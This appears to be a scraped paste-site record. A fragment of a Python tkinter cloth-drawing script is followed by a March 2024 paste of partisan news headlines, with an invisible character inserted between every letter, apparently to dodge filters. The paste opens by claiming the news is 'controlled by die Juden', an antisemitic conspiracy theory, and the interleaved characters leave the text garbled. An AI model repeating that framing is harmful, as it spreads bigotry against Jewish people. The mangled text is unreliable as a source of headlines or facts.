		point_coords = [(points[y * (cloth_width + 1) + x]['x'], points[y * (cloth_width + 1) + x]['y']) for y in range(cloth_height + 1)]
		canvas.create_line(point_coords, tags='cloth', fill='black')

	root.update()

root.mainloop()"
dQ6BkcZL,News March26 24,Newscaster_Ned,Email,Tuesday 26th of March 2024 09:43:35 PM CDT,".‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé1‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé2‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé3‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé ‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äéc‚Äéo‚Äém‚Äép‚Äél‚Äée‚Äét‚Äée‚Äé.‚Äé

W‚Äéa‚Äén‚Äét‚Äé ‚Äéa‚Äé ‚Äéd‚Äéi‚Äév‚Äée‚Äér‚Äés‚Äée‚Äé ‚Äém‚Äéi‚Äéx‚Äét‚Äéu‚Äér‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äéi‚Äén‚Äéf‚Äéo‚Äér‚Äém‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéa‚Äéb‚Äéo‚Äéu‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äév‚Äéa‚Äér‚Äéi‚Äéo‚Äéu‚Äés‚Äé ‚Äée‚Äév‚Äée‚Äén‚Äét‚Äés‚Äé ‚Äég‚Äéo‚Äéi‚Äén‚Äég‚Äé ‚Äéo‚Äén‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéw‚Äéo‚Äér‚Äél‚Äéd‚Äé?‚Äé ‚ÄéW‚Äée‚Äél‚Äél‚Äé ‚Äéy‚Äéo‚Äéu‚Äé ‚Äéc‚Äéa‚Äén‚Äé'‚Äét‚Äé ‚Äég‚Äée‚Äét‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äéc‚Äéa‚Äéu‚Äés‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äén‚Äée‚Äéw‚Äés‚Äé ‚Äéi‚Äés‚Äé ‚Äéc‚Äéo‚Äén‚Äét‚Äér‚Äéo‚Äél‚Äél‚Äée‚Äéd‚Äé ‚Äéb‚Äéy‚Äé ‚Äéd‚Äéi‚Äée‚Äé ‚ÄéJ‚Äéu‚Äéd‚Äée‚Äén‚Äé.‚Äé ‚ÄéS‚Äéo‚Äé ‚Äéh‚Äée‚Äér‚Äée‚Äé'‚Äés‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äé""‚Äén‚Äée‚Äéw‚Äés‚Äé""‚Äé!‚Äé

M‚Äéc‚ÄéC‚Äéa‚Äés‚Äék‚Äéi‚Äél‚Äél‚Äé:‚Äé ‚ÄéI‚Äé ‚ÄéS‚Äét‚Äér‚Äéu‚Äég‚Äég‚Äél‚Äée‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚ÄéG‚Äér‚Äéa‚Äés‚Äép‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéR‚Äée‚Äéa‚Äél‚Äéi‚Äét‚Äéy‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚ÄéW‚Äée‚Äé ‚ÄéE‚Äél‚Äée‚Äéc‚Äét‚Äée‚Äéd‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé
D‚Äée‚ÄéS‚Äéa‚Äén‚Äét‚Äéi‚Äés‚Äé ‚ÄéS‚Äéi‚Äég‚Äén‚Äés‚Äé ‚ÄéL‚Äée‚Äég‚Äéi‚Äés‚Äél‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚ÄéA‚Äéi‚Äém‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚ÄéP‚Äér‚Äéo‚Äét‚Äée‚Äéc‚Äét‚Äé ‚ÄéM‚Äéi‚Äén‚Äéo‚Äér‚Äés‚Äé ‚ÄéO‚Äén‚Äél‚Äéi‚Äén‚Äée‚Äé
G‚Äéo‚Äév‚Äé.‚Äé ‚ÄéY‚Äéo‚Äéu‚Äén‚Äég‚Äék‚Äéi‚Äén‚Äé ‚ÄéV‚Äée‚Äét‚Äéo‚Äée‚Äés‚Äé ‚ÄéV‚Äéi‚Äér‚Äég‚Äéi‚Äén‚Äéi‚Äéa‚Äé ‚ÄéD‚Äée‚Äém‚Äéo‚Äéc‚Äér‚Äéa‚Äét‚Äés‚Äé'‚Äé ‚Äé'‚ÄéA‚Äés‚Äés‚Äéa‚Äéu‚Äél‚Äét‚Äé ‚ÄéW‚Äée‚Äéa‚Äép‚Äéo‚Äén‚Äés‚Äé'‚Äé ‚ÄéB‚Äéa‚Äén‚Äé
D‚Äée‚Äém‚Äé ‚ÄéR‚Äée‚Äép‚Äé.‚Äé ‚Äéo‚Äén‚Äé ‚ÄéB‚Äér‚Äéi‚Äéd‚Äég‚Äée‚Äé:‚Äé ‚ÄéB‚Äéu‚Äét‚Äét‚Äéi‚Äég‚Äéi‚Äée‚Äég‚Äé ‚ÄéS‚Äéa‚Äéy‚Äés‚Äé ‚Äé'‚ÄéY‚Äéo‚Äéu‚Äé ‚ÄéC‚Äéa‚Äén‚Äé ‚ÄéN‚Äée‚Äév‚Äée‚Äér‚Äé ‚ÄéH‚Äéa‚Äév‚Äée‚Äé ‚ÄéE‚Äén‚Äéo‚Äéu‚Äég‚Äéh‚Äé ‚ÄéR‚Äée‚Äég‚Äéu‚Äél‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äés‚Äé'‚Äé
K‚Äél‚Äéo‚Äéb‚Äéu‚Äéc‚Äéh‚Äéa‚Äér‚Äé:‚Äé ‚ÄéT‚Äéh‚Äéi‚Äés‚Äé ‚ÄéE‚Äél‚Äée‚Äéc‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚ÄéI‚Äés‚Äé ‚ÄéA‚Äéb‚Äéo‚Äéu‚Äét‚Äé ‚Äé'‚ÄéC‚Äéo‚Äéd‚Äéi‚Äéf‚Äéy‚Äéi‚Äén‚Äég‚Äé ‚ÄéR‚Äéo‚Äée‚Äé ‚Äév‚Äé.‚Äé ‚ÄéW‚Äéa‚Äéd‚Äée‚Äé ‚ÄéI‚Äén‚Äét‚Äéo‚Äé ‚ÄéL‚Äéa‚Äéw‚Äé'‚Äé
G‚Äée‚Äét‚Äé ‚ÄéA‚Äél‚Äél‚Äé ‚ÄéB‚Äér‚Äée‚Äéi‚Äét‚Äéb‚Äéa‚Äér‚Äét‚Äé ‚ÄéN‚Äée‚Äéw‚Äés‚Äé ‚ÄéH‚Äée‚Äér‚Äée‚Äé
H‚Äéo‚Äém‚Äée‚ÄéP‚Äéa‚Äég‚Äée‚Äé
B‚Äéi‚Äéd‚Äée‚Äén‚Äé:‚Äé ‚ÄéG‚Äéo‚Äév‚Äée‚Äér‚Äén‚Äém‚Äée‚Äén‚Äét‚Äé ‚ÄéW‚Äéi‚Äél‚Äél‚Äé ‚ÄéP‚Äéa‚Äéy‚Äé ‚Äé‚Äò‚ÄéE‚Äén‚Äét‚Äéi‚Äér‚Äée‚Äé ‚ÄéC‚Äéo‚Äés‚Äét‚Äé‚Äô‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéR‚Äée‚Äéb‚Äéu‚Äéi‚Äél‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚ÄéB‚Äéa‚Äél‚Äét‚Äéi‚Äém‚Äéo‚Äér‚Äée‚Äé ‚ÄéB‚Äér‚Äéi‚Äéd‚Äég‚Äée‚Äé

‚Äô‚ÄéW‚Äée‚Äé‚Äô‚Äér‚Äée‚Äé ‚ÄéN‚Äéo‚Äét‚Äé ‚ÄéL‚Äée‚Äéa‚Äév‚Äéi‚Äén‚Äég‚Äé ‚ÄéU‚Äén‚Äét‚Äéi‚Äél‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéJ‚Äéo‚Äéb‚Äé ‚ÄéI‚Äés‚Äé ‚ÄéD‚Äéo‚Äén‚Äée‚Äé‚Äô‚Äé
B‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚ÄéB‚Äéa‚Äél‚Äét‚Äéi‚Äém‚Äéo‚Äér‚Äée‚Äé
P‚Äér‚Äée‚Äés‚Äéi‚Äéd‚Äée‚Äén‚Äét‚Äé ‚ÄéJ‚Äéo‚Äée‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚Äés‚Äéa‚Äéi‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äég‚Äéo‚Äév‚Äée‚Äér‚Äén‚Äém‚Äée‚Äén‚Äét‚Äé ‚Äéw‚Äéo‚Äéu‚Äél‚Äéd‚Äé ‚Äép‚Äéa‚Äéy‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äé‚Äú‚Äée‚Äén‚Äét‚Äéi‚Äér‚Äée‚Äé ‚Äéc‚Äéo‚Äés‚Äét‚Äé‚Äù‚Äé ‚Äéo‚Äéf‚Äé ‚Äér‚Äée‚Äéb‚Äéu‚Äéi‚Äél‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéF‚Äér‚Äéa‚Äén‚Äéc‚Äéi‚Äés‚Äé ‚ÄéS‚Äéc‚Äéo‚Äét‚Äét‚Äé ‚ÄéK‚Äée‚Äéy‚Äé ‚ÄéB‚Äér‚Äéi‚Äéd‚Äég‚Äée‚Äé ‚Äéi‚Äén‚Äé ‚ÄéB‚Äéa‚Äél‚Äét‚Äéi‚Äém‚Äéo‚Äér‚Äée‚Äé,‚Äé ‚ÄéM‚Äéa‚Äér‚Äéy‚Äél‚Äéa‚Äén‚Äéd‚Äé.‚Äé

K‚Äéa‚Äér‚Äéi‚Äén‚Äée‚Äé ‚ÄéJ‚Äée‚Äéa‚Äén‚Äé-‚ÄéP‚Äéi‚Äée‚Äér‚Äér‚Äée‚Äé ‚ÄéM‚Äée‚Äél‚Äét‚Äés‚Äé ‚ÄéD‚Äéo‚Äéw‚Äén‚Äé,‚Äé ‚ÄéH‚Äéa‚Äén‚Äég‚Äés‚Äé ‚ÄéU‚Äép‚Äé ‚ÄéS‚Äéh‚Äéo‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéR‚Äéa‚Äéd‚Äéi‚Äéo‚Äé ‚ÄéH‚Äéo‚Äés‚Äét‚Äé ‚ÄéA‚Äés‚Äék‚Äés‚Äé ‚ÄéI‚Äéf‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚ÄéH‚Äéa‚Äés‚Äé ‚Äé‚Äò‚ÄéD‚Äée‚Äém‚Äée‚Äén‚Äét‚Äéi‚Äéa‚Äé‚Äô‚Äé
K‚Äéa‚Äér‚Äéi‚Äén‚Äée‚Äé ‚ÄéJ‚Äée‚Äéa‚Äén‚Äé-‚ÄéP‚Äéi‚Äée‚Äér‚Äér‚Äée‚Äé ‚ÄéH‚Äéa‚Äés‚Äé ‚ÄéM‚Äée‚Äél‚Äét‚Äéd‚Äéo‚Äéw‚Äén‚Äé ‚ÄéW‚Äéh‚Äée‚Äén‚Äé ‚ÄéR‚Äéa‚Äéd‚Äéi‚Äéo‚Äé ‚ÄéH‚Äéo‚Äés‚Äét‚Äé ‚ÄéA‚Äés‚Äék‚Äés‚Äé ‚ÄéI‚Äéf‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚ÄéH‚Äéa‚Äés‚Äé ‚ÄéD‚Äée‚Äém‚Äée‚Äén‚Äét‚Äéi‚Äéa‚Äé
3‚Äé4‚Äé1‚Äé
R‚Äée‚Äép‚Äéo‚Äér‚Äét‚Äé:‚Äé ‚ÄéN‚ÄéB‚ÄéC‚Äé ‚ÄéN‚Äée‚Äéw‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚ÄéD‚Äér‚Äéo‚Äép‚Äé ‚ÄéR‚Äéo‚Äén‚Äén‚Äéa‚Äé ‚ÄéM‚Äéc‚ÄéD‚Äéa‚Äén‚Äéi‚Äée‚Äél‚Äé,‚Äé ‚ÄéW‚Äéh‚Äéo‚Äé ‚ÄéS‚Äée‚Äée‚Äék‚Äés‚Äé ‚ÄéL‚Äée‚Äég‚Äéa‚Äél‚Äé ‚ÄéR‚Äée‚Äép‚Äér‚Äée‚Äés‚Äée‚Äén‚Äét‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äé ‚Äé
R‚Äée‚Äép‚Äéo‚Äér‚Äét‚Äé:‚Äé ‚ÄéN‚ÄéB‚ÄéC‚Äé ‚ÄéN‚Äée‚Äéw‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚ÄéD‚Äér‚Äéo‚Äép‚Äé ‚ÄéR‚Äéo‚Äén‚Äén‚Äéa‚Äé ‚ÄéM‚Äéc‚ÄéD‚Äéa‚Äén‚Äéi‚Äée‚Äél‚Äé,‚Äé ‚ÄéW‚Äéh‚Äéo‚Äé ‚ÄéS‚Äée‚Äée‚Äék‚Äés‚Äé ‚ÄéL‚Äée‚Äég‚Äéa‚Äél‚Äé ‚ÄéR‚Äée‚Äép‚Äér‚Äée‚Äés‚Äée‚Äén‚Äét‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äé ‚Äé
8‚Äé6‚Äé0‚Äé
D‚Äéo‚Äén‚Äéa‚Äél‚Äéd‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé:‚Äé ‚Äé‚Äò‚ÄéI‚Äét‚Äé ‚ÄéW‚Äéi‚Äél‚Äél‚Äé ‚ÄéB‚Äée‚Äé ‚ÄéM‚Äéy‚Äé ‚ÄéH‚Äéo‚Äén‚Äéo‚Äér‚Äé ‚Äét‚Äéo‚Äé ‚ÄéP‚Äéo‚Äés‚Äét‚Äé‚Äô‚Äé ‚Äé$‚Äé1‚Äé7‚Äé5‚ÄéM‚Äé ‚ÄéB‚Äéo‚Äén‚Äéd‚Äé
D‚Äéo‚Äén‚Äéa‚Äél‚Äéd‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé:‚Äé ‚Äé'‚ÄéI‚Äét‚Äé ‚ÄéW‚Äéi‚Äél‚Äél‚Äé ‚ÄéB‚Äée‚Äé ‚ÄéM‚Äéy‚Äé ‚ÄéH‚Äéo‚Äén‚Äéo‚Äér‚Äé ‚Äét‚Äéo‚Äé ‚ÄéP‚Äéo‚Äés‚Äét‚Äé'‚Äé ‚Äé$‚Äé1‚Äé7‚Äé5‚ÄéM‚Äé ‚ÄéB‚Äéo‚Äén‚Äéd‚Äé
8‚Äé,‚Äé2‚Äé0‚Äé2‚Äé
N‚Äée‚Äéw‚Äé ‚ÄéY‚Äéo‚Äér‚Äék‚Äé ‚ÄéA‚Äép‚Äép‚Äée‚Äéa‚Äél‚Äés‚Äé ‚ÄéC‚Äéo‚Äéu‚Äér‚Äét‚Äé ‚ÄéP‚Äéa‚Äéu‚Äés‚Äée‚Äés‚Äé ‚Äé$‚Äé4‚Äé6‚Äé4‚ÄéM‚Äé ‚ÄéJ‚Äéu‚Äéd‚Äég‚Äém‚Äée‚Äén‚Äét‚Äé ‚ÄéA‚Äég‚Äéa‚Äéi‚Äén‚Äés‚Äét‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé
N‚Äée‚Äéw‚Äé ‚ÄéY‚Äéo‚Äér‚Äék‚Äé ‚ÄéA‚Äép‚Äép‚Äée‚Äéa‚Äél‚Äés‚Äé ‚ÄéC‚Äéo‚Äéu‚Äér‚Äét‚Äé ‚ÄéP‚Äéa‚Äéu‚Äés‚Äée‚Äés‚Äé ‚Äé$‚Äé4‚Äé6‚Äé4‚ÄéM‚Äé ‚ÄéJ‚Äéu‚Äéd‚Äég‚Äém‚Äée‚Äén‚Äét‚Äé ‚ÄéA‚Äég‚Äéa‚Äéi‚Äén‚Äés‚Äét‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé
5‚Äé,‚Äé6‚Äé3‚Äé2‚Äé
‚Äò‚ÄéM‚Äéa‚Äés‚Äés‚Äé ‚ÄéC‚Äéa‚Äés‚Äéu‚Äéa‚Äél‚Äét‚Äéy‚Äé ‚ÄéE‚Äév‚Äée‚Äén‚Äét‚Äé‚Äô‚Äé:‚Äé ‚Äé1‚Äé.‚Äé6‚Äé ‚ÄéM‚Äéi‚Äél‚Äée‚Äé ‚ÄéB‚Äéa‚Äél‚Äét‚Äéi‚Äém‚Äéo‚Äér‚Äée‚Äé ‚ÄéB‚Äér‚Äéi‚Äéd‚Äég‚Äée‚Äé ‚ÄéC‚Äéo‚Äél‚Äél‚Äéa‚Äép‚Äés‚Äée‚Äés‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéB‚Äée‚Äéi‚Äén‚Äég‚Äé ‚ÄéS‚Äét‚Äér‚Äéu‚Äéc‚Äék‚Äé ‚Äéb‚Äéy‚Äé ‚ÄéC‚Äéa‚Äér‚Äég‚Äéo‚Äé ‚Äé
'‚ÄéM‚Äéa‚Äés‚Äés‚Äé ‚ÄéC‚Äéa‚Äés‚Äéu‚Äéa‚Äél‚Äét‚Äéy‚Äé ‚ÄéE‚Äév‚Äée‚Äén‚Äét‚Äé'‚Äé:‚Äé ‚ÄéB‚Äéa‚Äél‚Äét‚Äéi‚Äém‚Äéo‚Äér‚Äée‚Äé ‚ÄéB‚Äér‚Äéi‚Äéd‚Äég‚Äée‚Äé ‚ÄéC‚Äéo‚Äél‚Äél‚Äéa‚Äép‚Äés‚Äée‚Äés‚Äé,‚Äé ‚ÄéH‚Äéi‚Äét‚Äé ‚Äéb‚Äéy‚Äé ‚ÄéC‚Äéa‚Äér‚Äég‚Äéo‚Äé ‚ÄéS‚Äéh‚Äéi‚Äép‚Äé
9‚Äé,‚Äé2‚Äé6‚Äé3‚Äé
R‚ÄéF‚ÄéK‚Äé ‚ÄéJ‚Äér‚Äé.‚Äé ‚ÄéV‚ÄéP‚Äé ‚ÄéP‚Äéi‚Äéc‚Äék‚Äé ‚ÄéN‚Äéi‚Äéc‚Äéo‚Äél‚Äée‚Äé ‚ÄéS‚Äéh‚Äéa‚Äén‚Äéa‚Äéh‚Äéa‚Äén‚Äé ‚Äéa‚Äé ‚ÄéL‚Äée‚Äéf‚Äét‚Äéi‚Äés‚Äét‚Äé ‚Äé‚Äò‚ÄéC‚Äér‚Äéi‚Äém‚Äéi‚Äén‚Äéa‚Äél‚Äé ‚ÄéJ‚Äéu‚Äés‚Äét‚Äéi‚Äéc‚Äée‚Äé‚Äô‚Äé ‚ÄéA‚Äéd‚Äév‚Äéo‚Äéc‚Äéa‚Äét‚Äée‚Äé ‚ÄéW‚Äéh‚Äéo‚Äé ‚ÄéH‚Äéa‚Äés‚Äé ‚ÄéG‚Äéi‚Äév‚Äée‚Äén‚Äé ‚ÄéT‚Äéh‚Äéo‚Äéu‚Äés‚Äéa‚Äén‚Äéd‚Äés‚Äé ‚Äét‚Äé
R‚ÄéF‚ÄéK‚Äé ‚ÄéJ‚Äér‚Äé.‚Äé ‚ÄéV‚ÄéP‚Äé ‚ÄéP‚Äéi‚Äéc‚Äék‚Äé ‚ÄéN‚Äéi‚Äéc‚Äéo‚Äél‚Äée‚Äé ‚ÄéS‚Äéh‚Äéa‚Äén‚Äéa‚Äéh‚Äéa‚Äén‚Äé ‚Äéa‚Äé ‚ÄéL‚Äée‚Äéf‚Äét‚Äéi‚Äés‚Äét‚Äé ‚Äé‚Äò‚ÄéC‚Äér‚Äéi‚Äém‚Äéi‚Äén‚Äéa‚Äél‚Äé ‚ÄéJ‚Äéu‚Äés‚Äét‚Äéi‚Äéc‚Äée‚Äé‚Äô‚Äé ‚ÄéA‚Äéd‚Äév‚Äéo‚Äéc‚Äéa‚Äét‚Äée‚Äé
9‚Äé5‚Äé0‚Äé
G‚Äér‚Äée‚Äée‚Äén‚Äée‚Äé:‚Äé ‚ÄéS‚Äép‚Äée‚Äéa‚Äék‚Äée‚Äér‚Äé ‚ÄéJ‚Äéo‚Äéh‚Äén‚Äés‚Äéo‚Äén‚Äé ‚ÄéS‚Äét‚Äéa‚Äéb‚Äéb‚Äéi‚Äén‚Äég‚Äé ‚ÄéG‚ÄéO‚ÄéP‚Äé ‚ÄéV‚Äéo‚Äét‚Äée‚Äér‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéB‚Äéa‚Äéc‚Äék‚Äé,‚Äé ‚ÄéH‚Äée‚Äé ‚ÄéN‚Äée‚Äée‚Äéd‚Äés‚Äé ‚Äéa‚Äé ‚Äé‚Äò‚ÄéP‚Äéi‚Äén‚Äék‚Äé ‚ÄéS‚Äél‚Äéi‚Äép‚Äé‚Äô‚Äé
G‚Äér‚Äée‚Äée‚Äén‚Äée‚Äé:‚Äé ‚ÄéS‚Äép‚Äée‚Äéa‚Äék‚Äée‚Äér‚Äé ‚ÄéJ‚Äéo‚Äéh‚Äén‚Äés‚Äéo‚Äén‚Äé ‚ÄéS‚Äét‚Äéa‚Äéb‚Äéb‚Äéi‚Äén‚Äég‚Äé ‚ÄéG‚ÄéO‚ÄéP‚Äé ‚ÄéV‚Äéo‚Äét‚Äée‚Äér‚Äés‚Äé ‚ÄéI‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéB‚Äéa‚Äéc‚Äék‚Äé,‚Äé ‚ÄéN‚Äée‚Äée‚Äéd‚Äés‚Äé ‚Äé'‚ÄéP‚Äéi‚Äén‚Äék‚Äé ‚ÄéS‚Äél‚Äéi‚Äép‚Äé'‚Äé
1‚Äé5‚Äé6‚Äé
B‚Äér‚Äée‚Äét‚Äéi‚Äéb‚Äéa‚Äér‚Äét‚Äé ‚ÄéB‚Äéu‚Äés‚Äéi‚Äén‚Äée‚Äés‚Äés‚Äé ‚ÄéD‚Äéi‚Äég‚Äée‚Äés‚Äét‚Äé:‚Äé ‚ÄéT‚Äéh‚Äée‚Äé ‚ÄéE‚Äéc‚Äéo‚Äén‚Äéo‚Äém‚Äéi‚Äéc‚Äé ‚ÄéC‚Äéo‚Äén‚Äés‚Äée‚Äéq‚Äéu‚Äée‚Äén‚Äéc‚Äée‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéB‚Äéa‚Äél‚Äét‚Äéi‚Äém‚Äéo‚Äér‚Äée‚Äé ‚ÄéC‚Äéa‚Äét‚Äéa‚Äés‚Äét‚Äér‚Äéo‚Äép‚Äéh‚Äée‚Äé
B‚ÄéB‚ÄéD‚Äé:‚Äé ‚ÄéT‚Äéh‚Äée‚Äé ‚ÄéE‚Äéc‚Äéo‚Äén‚Äéo‚Äém‚Äéi‚Äéc‚Äé ‚ÄéC‚Äéo‚Äén‚Äés‚Äée‚Äéq‚Äéu‚Äée‚Äén‚Äéc‚Äée‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéB‚Äéa‚Äél‚Äét‚Äéi‚Äém‚Äéo‚Äér‚Äée‚Äé ‚ÄéC‚Äéa‚Äét‚Äéa‚Äés‚Äét‚Äér‚Äéo‚Äép‚Äéh‚Äée‚Äé
1‚Äé1‚Äé9‚Äé
1‚Äé3‚Äé ‚ÄéD‚Äée‚Äém‚Äéo‚Äéc‚Äér‚Äéa‚Äét‚Äé ‚ÄéS‚Äét‚Äéa‚Äét‚Äée‚Äé ‚ÄéA‚Äét‚Äét‚Äéo‚Äér‚Äén‚Äée‚Äéy‚Äés‚Äé ‚ÄéG‚Äée‚Äén‚Äée‚Äér‚Äéa‚Äél‚Äé ‚ÄéT‚Äéa‚Äér‚Äég‚Äée‚Äét‚Äé ‚ÄéG‚Äél‚Äéo‚Äéc‚Äék‚Äé,‚Äé ‚ÄéD‚Äée‚Äéc‚Äér‚Äéy‚Äé ‚Äé‚Äò‚ÄéM‚Äéa‚Äéc‚Äéh‚Äéi‚Äén‚Äée‚Äé-‚ÄéG‚Äéu‚Äén‚Äé ‚ÄéG‚Äél‚Äéo‚Äéc‚Äék‚Äés‚Äé‚Äô‚Äé
1‚Äé3‚Äé ‚ÄéB‚Äél‚Äéu‚Äée‚Äé ‚ÄéS‚Äét‚Äéa‚Äét‚Äée‚Äé ‚ÄéA‚Äét‚Äét‚Äéo‚Äér‚Äén‚Äée‚Äéy‚Äés‚Äé ‚ÄéG‚Äée‚Äén‚Äée‚Äér‚Äéa‚Äél‚Äé ‚ÄéF‚Äéo‚Äél‚Äél‚Äéo‚Äéw‚Äé ‚ÄéC‚Äéh‚Äéi‚Äéc‚Äéa‚Äég‚Äéo‚Äé'‚Äés‚Äé ‚ÄéL‚Äée‚Äéa‚Äéd‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéT‚Äéa‚Äér‚Äég‚Äée‚Äét‚Äé ‚ÄéG‚Äél‚Äéo‚Äéc‚Äék‚Äé
2‚Äé0‚Äé1‚Äé
V‚ÄéI‚ÄéD‚ÄéE‚ÄéO‚Äé:‚Äé ‚ÄéT‚Äée‚Äéa‚Äém‚Äés‚Äé ‚ÄéS‚Äée‚Äéa‚Äér‚Äéc‚Äéh‚Äéi‚Äén‚Äég‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéP‚Äée‚Äéo‚Äép‚Äél‚Äée‚Äé ‚ÄéW‚Äéh‚Äéo‚Äé ‚ÄéF‚Äée‚Äél‚Äél‚Äé ‚Äéi‚Äén‚Äét‚Äéo‚Äé ‚ÄéR‚Äéi‚Äév‚Äée‚Äér‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéB‚Äéa‚Äél‚Äét‚Äéi‚Äém‚Äéo‚Äér‚Äée‚Äé ‚ÄéB‚Äér‚Äéi‚Äéd‚Äég‚Äée‚Äé ‚ÄéC‚Äéo‚Äél‚Äél‚Äéa‚Äép‚Äés‚Äée‚Äé
V‚ÄéI‚ÄéD‚ÄéE‚ÄéO‚Äé:‚Äé ‚ÄéS‚Äée‚Äéa‚Äér‚Äéc‚Äéh‚Äé ‚ÄéU‚Äén‚Äéd‚Äée‚Äér‚Äéw‚Äéa‚Äéy‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéV‚Äéi‚Äéc‚Äét‚Äéi‚Äém‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéB‚Äéa‚Äél‚Äét‚Äéi‚Äém‚Äéo‚Äér‚Äée‚Äé ‚ÄéB‚Äér‚Äéi‚Äéd‚Äég‚Äée‚Äé ‚ÄéC‚Äéo‚Äél‚Äél‚Äéa‚Äép‚Äés‚Äée‚Äé

P‚Äéo‚Äél‚Äéi‚Äéc‚Äée‚Äé ‚ÄéA‚Äér‚Äér‚Äée‚Äés‚Äét‚Äé ‚ÄéG‚Äér‚Äéo‚Äéi‚Äéd‚Äé ‚ÄéR‚Äéa‚Äép‚Äéi‚Äés‚Äét‚Äé ‚Äéi‚Äén‚Äé ‚ÄéS‚Äéo‚Äéu‚Äét‚Äéh‚Äé ‚ÄéP‚Äéh‚Äéi‚Äél‚Äél‚Äéy‚Äé ‚ÄéW‚Äéh‚Äéo‚Äé ‚ÄéG‚Äéa‚Äév‚Äée‚Äé ‚ÄéM‚Äéu‚Äél‚Äét‚Äéi‚Äép‚Äél‚Äée‚Äé ‚ÄéW‚Äéo‚Äém‚Äée‚Äén‚Äé ‚ÄéA‚ÄéI‚ÄéD‚ÄéS‚Äé.‚Äé

